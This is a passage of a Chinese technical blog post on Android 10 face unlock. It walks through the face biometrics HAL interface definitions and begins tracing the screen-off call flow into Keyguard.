        <content type="html"><![CDATA[<h3 id="人脸解锁概述"><a href="#人脸解锁概述" class="headerlink" title="人脸解锁概述"></a>人脸解锁概述</h3><p>人脸解锁即用户通过注视设备的正面方便地解锁手机或平板。Android 10 为支持人脸解锁的设备在人脸认证期间添加了一个新的可以安全处理相机帧、保持隐私与安全的人脸认证栈的支持，也为安全合规地启用集成交易的应用（网上银行或其他服务）提供了一种容易实现的方式。<br>Android 原生的人脸认证栈在 Android 10 是一种新的实现，与 Android P 不一样了。新增 IBiometricsFace.hal ，IBiometricsFaceClientCallback.hal 和 types.hal 这些接口。例如：我这边的源码都是 extends 以上接口，进行了些扩展后再实现的。</p><h3 id="底层-Face-HIDL简单认识"><a href="#底层-Face-HIDL简单认识" class="headerlink" title="底层 Face HIDL简单认识"></a>底层 Face HIDL简单认识</h3><p>为了实现 Face HIDL，必须在供应商 (vendor) 指定的库 (library) 里实现 IBiometricsFace.hal 的所有方法。接下来我们就来看看 hardware/interfaces/biometrics/face/1.0 目录下的源代码。<br><strong>hardware/interfaces/biometrics/face/1.0/IBiometricsFace.hal</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> android.hardware.biometrics.face@<span class="number">1.0</span>;</span><br><span class="line"><span class="keyword">import</span> IBiometricsFaceClientCallback;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用于人脸认证的 HAL 接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IBiometricsFace</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置当前的客户端回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@callflow(next=&#123;&quot;setActiveUser&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@entry</span></span><br><span class="line">    setCallback(IBiometricsFaceClientCallback clientCallback)</span><br><span class="line">        generates (OptionalUint64 result);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置所有随后的 HAL 操作作用于上面的活跃用户</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@callflow(next=&#123;&quot;authenticate&quot;, &quot;generateChallenge&quot;, &quot;enumerate&quot;, &quot;remove&quot;&#125;)</span></span><br><span class="line">    setActiveUser(int32_t userId, string storePath) generates (Status status);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成随机数，用于 token 校验</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@callflow(next=&#123;&quot;enroll&quot;, &quot;revokeChallenge&quot;, &quot;setFeature&quot;&#125;)</span></span><br><span class="line">    generateChallenge(uint32_t challengeTimeoutSec)</span><br><span class="line">        generates (OptionalUint64 result);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 录入一张用户的人脸</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@callflow(next=&#123;&quot;cancel&quot;, &quot;enroll&quot;, &quot;revokeChallenge&quot;, &quot;remove&quot;&#125;)</span></span><br><span class="line">    enroll(vec&lt;uint8_t&gt; hat, uint32_t timeoutSec, vec&lt;Feature&gt; disabledFeatures)</span><br><span class="line">        generates (Status status);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 撤销随机数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@callflow(next=&#123;&quot;authenticate&quot;, &quot;setActiveUser&quot;, &quot;enumerate&quot;, &quot;remove&quot;&#125;)</span></span><br><span class="line">    revokeChallenge() generates (Status status);</span><br><span class="line">    setFeature(Feature feature, bool enabled, vec&lt;uint8_t&gt; hat, uint32_t faceId)</span><br><span class="line">        generates(Status status);</span><br><span class="line">    getFeature(Feature feature, uint32_t faceId) generates (OptionalBool result);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回和当前人脸集关联的标识符 (ID)，认证者 ID</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@callflow(next=&#123;&quot;authenticate&quot;&#125;)</span></span><br><span class="line">    getAuthenticatorId() generates (OptionalUint64 result);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 取消当前的录入、认证、删除人脸或枚举人脸的操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@callflow(next=&#123;&quot;authenticate&quot;, &quot;enroll&quot;, &quot;enumerate&quot;, &quot;remove&quot;,</span></span><br><span class="line"><span class="meta">        &quot;setActiveUser&quot;&#125;)</span></span><br><span class="line">    cancel() generates (Status status);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 枚举正在使用系统的用户的所有人脸模板</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@callflow(next=&#123;&quot;remove&quot;, &quot;enroll&quot;, &quot;authenticate&quot;, &quot;setActiveUser&quot;&#125;)</span></span><br><span class="line">    enumerate() generates (Status status);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除正在使用系统的用户的一个或所有人脸模板</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@callflow(next=&#123;&quot;enumerate&quot;, &quot;authenticate&quot;, &quot;cancel&quot;, &quot;getAuthenticatorId&quot;,</span></span><br><span class="line"><span class="meta">        &quot;setActiveUser&quot;&#125;)</span></span><br><span class="line">    remove(uint32_t faceId) generates (Status status);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 认证当前用户是否登录系统的用户</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@callflow(next=&#123;&quot;cancel&quot;, &quot;generateChallenge&quot;, &quot;remove&quot;&#125;)</span></span><br><span class="line">    authenticate(uint64_t operationId) generates (Status status);</span><br><span class="line">    userActivity() generates (Status status);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 为当前用户重置禁用状态</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    resetLockout(vec&lt;uint8_t&gt; hat) generates (Status status);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>hardware/interfaces/biometrics/face/1.0/IBiometricsFaceClientCallback.hal</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> android.hardware.biometrics.face@<span class="number">1.0</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 这个回调接口被客户端用来接收人脸 HAL 的（状态）更新</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IBiometricsFaceClientCallback</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当录入的步骤完成时被回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    oneway <span class="title function_">onEnrollResult</span><span class="params">(uint64_t deviceId, uint32_t faceId, int32_t userId,</span></span><br><span class="line"><span class="params">        uint32_t remaining)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当一张人脸被成功认证时被回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    oneway <span class="title function_">onAuthenticated</span><span class="params">(uint64_t deviceId, uint32_t faceId, int32_t userId,</span></span><br><span class="line"><span class="params">        vec&lt;uint8_t&gt; token)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当底层获得一张人脸时被回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     oneway <span class="title function_">onAcquired</span><span class="params">(uint64_t deviceId, int32_t userId,</span></span><br><span class="line"><span class="params">         FaceAcquiredInfo acquiredInfo, int32_t vendorCode)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当错误发生时被回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    oneway <span class="title function_">onError</span><span class="params">(uint64_t deviceId, int32_t userId, FaceError error,</span></span><br><span class="line"><span class="params">        int32_t vendorCode)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当人脸模板被删除时被回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    oneway <span class="title function_">onRemoved</span><span class="params">(uint64_t deviceId, vec&lt;uint32_t&gt; removed, int32_t userId)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 枚举所有人脸模板的回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    oneway <span class="title function_">onEnumerate</span><span class="params">(uint64_t deviceId, vec&lt;uint32_t&gt; faceIds,</span></span><br><span class="line"><span class="params">        int32_t userId)</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当禁用状态改变时被回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    oneway <span class="title function_">onLockoutChanged</span><span class="params">(uint64_t duration)</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>供应商（主要是手机厂商）需要实现上述接口的方法并集成人脸识别算法，完成录入和认证等的底层实现。<br><strong>hardware/interfaces/biometrics/face/1.0/types.hal</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> android.hardware.biometrics.face@<span class="number">1.0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在这里 setActiveUser 不会被调用，所有错误消息会返回这个用户 ID</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">UserHandle</span> : int32_t &#123;</span><br><span class="line">    NONE = -<span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 状态码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Status</span> : uint32_t &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法被成功调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    OK = <span class="number">0</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法调用的参数之一无效</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ILLEGAL_ARGUMENT = <span class="number">1</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 人脸 HAL 不支持这个操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    OPERATION_NOT_SUPPORTED = <span class="number">2</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  HAL 遭遇内部错误，不能完成请求</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    INTERNAL_ERROR = <span class="number">3</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 没有录入人脸</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    NOT_ENROLLED = <span class="number">4</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Feature</span> : uint32_t &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 要求注视</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    REQUIRE_ATTENTION = <span class="number">1</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 要求录入时姿势多样（有变化） </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    REQUIRE_DIVERSITY = <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * onError 回调的人脸错误消息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">FaceError</span> : int32_t &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 不能被解析的硬件错误</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    HW_UNAVAILABLE = <span class="number">1</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 不能处理当前操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    UNABLE_TO_PROCESS = <span class="number">2</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 超时</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    TIMEOUT = <span class="number">3</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 没有足够的存储空间去完成当前的操作</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    NO_SPACE = <span class="number">4</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 被取消</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    CANCELED = <span class="number">5</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 无法删除</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    UNABLE_TO_REMOVE = <span class="number">6</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 30s 禁用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    LOCKOUT = <span class="number">7</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用来开启供应商指定的错误消息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    VENDOR = <span class="number">8</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 禁用直到使用主身份认证</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    LOCKOUT_PERMANENT = <span class="number">9</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 向客户端反馈获取人脸的消息（质量），以便用户做出相应的改变</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">FaceAcquiredInfo</span> : int32_t &#123;</span><br><span class="line">    GOOD = <span class="number">0</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 无效人脸</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    INSUFFICIENT = <span class="number">1</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 人脸太亮</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    TOO_BRIGHT = <span class="number">2</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 人脸太暗</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    TOO_DARK = <span class="number">3</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 人脸太近</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    TOO_CLOSE = <span class="number">4</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 人脸太远</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    TOO_FAR = <span class="number">5</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 人脸太高，只有下半部分</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    FACE_TOO_HIGH = <span class="number">6</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 人脸太低</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    FACE_TOO_LOW = <span class="number">7</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 人脸偏右</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    FACE_TOO_RIGHT = <span class="number">8</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 人脸偏左</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    FACE_TOO_LEFT = <span class="number">9</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 凝视不佳</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    POOR_GAZE = <span class="number">10</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 未检测到人脸</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    NOT_DETECTED = <span class="number">11</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检测到运动过多</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    TOO_MUCH_MOTION = <span class="number">12</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 重新校正</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    RECALIBRATE = <span class="number">13</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 和前一帧差异太大</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    TOO_DIFFERENT = <span class="number">14</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 和前一帧太相似</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    TOO_SIMILAR = <span class="number">15</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 摇射角度太大，直面相机角度为 0</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PAN_TOO_EXTREME = <span class="number">16</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 倾斜角度太大</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    TILT_TOO_EXTREME = <span class="number">17</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 侧倾角幅度太大</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ROLL_TOO_EXTREME = <span class="number">18</span>,</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 人脸被遮挡</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    FACE_OBSCURED = <span class="number">19</span>,</span><br><span class="line">    START = <span class="number">20</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 传感器（摄像头）脏了</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    SENSOR_DIRTY = <span class="number">21</span>,</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用于开启供应商指定的获取人脸的消息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    VENDOR = <span class="number">22</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">struct OptionalUint64 &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回的状态</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Status status;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只意味着状态是 OK 的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    uint64_t value;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">struct OptionalBool &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回的状态</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Status status;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只意味着状态是 OK 的</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    bool value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="人脸识别调用流程-注册监听、捕获人脸、比对"><a href="#人脸识别调用流程-注册监听、捕获人脸、比对" class="headerlink" title="人脸识别调用流程(注册监听、捕获人脸、比对)"></a>人脸识别调用流程(注册监听、捕获人脸、比对)</h3><p>人脸解锁的入口在Keyguard中，但息屏的处理是从PowerManager开始，最终到锁屏的核心类KeyguardViewMediator，息屏处理的大致流程如下：<br><img src="/images/20231210/20231210001.png"></p><p>前面几步就跳过，直接从PhoneWindowManager开始分析。灭屏之后会调用PhoneWindowManager的startedGoingToSleep方法：<br><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Called on the PowerManager&#x27;s Notifier thread.</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startedGoingToSleep</span><span class="params">(<span class="type">int</span> why)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG_WAKEUP) &#123;</span><br><span class="line">        Slog.i(TAG, <span class="string">&quot;Started going to sleep... (why=&quot;</span></span><br><span class="line">                + WindowManagerPolicyConstants.offReasonToString(why) + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mGoingToSleep = <span class="literal">true</span>;</span><br><span class="line">    mRequestedOrGoingToSleep = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (mKeyguardDelegate != <span class="literal">null</span>) &#123;</span><br><span class="line">        mKeyguardDelegate.onStartedGoingToSleep(why);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该方法中又调用了KeyguardServiceDelegate类的onStartedGoingToSleep方法。<br>KeyguardServiceDelegate#onStartedGoingToSleep →KeyguardServiceWrapper#onStartedGoingToSleep → KeyguardService#onStartedGoingToSleep  → KeyguardViewMediator#onStartedGoingToSleep，最终会调用到KeyguardViewMediator锁屏核心类。<br><strong>frameworks/base/packages/SystemUI/src/com/android/keyguard/KeyguardUpdateMonitor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 